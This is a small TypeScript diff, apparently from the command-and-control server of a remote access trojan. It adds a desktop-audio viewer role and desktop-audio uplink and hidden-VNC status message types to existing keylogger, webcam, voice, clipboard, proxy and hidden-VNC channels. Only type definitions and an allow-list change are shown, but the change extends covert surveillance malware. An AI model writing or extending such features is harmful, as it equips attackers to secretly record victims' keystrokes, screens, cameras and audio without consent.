@@ -1,4 +1,4 @@
-export type SocketRole = "client" | "viewer" | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "voice_viewer" | "notifications_viewer";
+export type SocketRole = "client" | "viewer" | "console_viewer" | "rd_viewer" | "webcam_viewer" | "hvnc_viewer" | "file_browser_viewer" | "process_viewer" | "keylogger_viewer" | "voice_viewer" | "desktop_audio_viewer" | "notifications_viewer";
 
 const textEncoder = new TextEncoder();
 
@@ -26,9 +26,11 @@ export const ALLOWED_CLIENT_MESSAGE_TYPES = new Set([
   "keylog_clear_result",
   "keylog_delete_result",
   "voice_uplink",
+  "desktop_audio_uplink",
   "webcam_devices",
   "hvnc_clone_progress",
   "hvnc_lookup_result",
+  "hvnc_dxgi_status",
   "clipboard_content",
   "proxy_data",
   "proxy_close",
